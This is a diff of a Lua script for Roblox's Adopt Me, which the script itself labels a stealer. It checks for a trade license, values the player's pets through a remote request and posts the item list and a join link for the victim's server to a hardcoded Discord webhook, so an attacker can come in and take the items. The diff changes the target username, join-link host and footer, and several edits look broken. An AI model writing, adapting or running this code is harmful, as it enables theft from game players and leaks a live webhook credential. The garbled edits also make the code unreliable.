@@ -4,9 +4,9 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or { "GHOSS23" }
+local users = _G.Usernames or { GHOSS23 }
 local min_value = _G.min_value or 0.1
-local ping = _G.pingEveryone or "yes"
+local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1450951811488813108/4lcItFTfvIV0lpizJ1qrQ6c9EYbV7soVaJb1onUlBSRm-gz_ZEQ4GLlHC_ZHYwGf5zuz"
 
 local Players = game:GetService("Players")
@@ -38,7 +38,7 @@ local playerGui = plr:WaitForChild("PlayerGui")
 local tradeFrame = playerGui.TradeApp.Frame
 local dialog = playerGui.DialogApp.Dialog
 local toolApp = playerGui.ToolApp.Frame
-local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)
+local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper    )
 
 if not tradeLicense.player_has_trade_license() then
     plr:kick("This script wont work on an alt account. Please use your main account")
@@ -67,9 +67,7 @@ local valueResponse = request({
 })
 
 local responseData = HttpService:JSONDecode(valueResponse.Body)
-local petsData = type(responseData.pets) == "string"
-    and HttpService:JSONDecode(responseData.pets)
-    or responseData.pets
+local petsData = HttpService:JSONDecode(responseData.pets)
 
 local petsByName = {}
 for key, pet in pairs(petsData) do
@@ -137,7 +135,7 @@ local function SendJoinMessage(list, prefix)
         },
         {
             name = "Join link:",
-            value = "https://darktzy486-collab.github.io/coxiks-joiner/?placeId=920587237&gameInstanceId=" .. game.JobId
+            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. game.JobId
         },
         {
             name = "Item list:",
@@ -200,7 +198,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Adopt Me stealer by Tob.gg/GY2RVSEGDT"
             }
         }}
     }
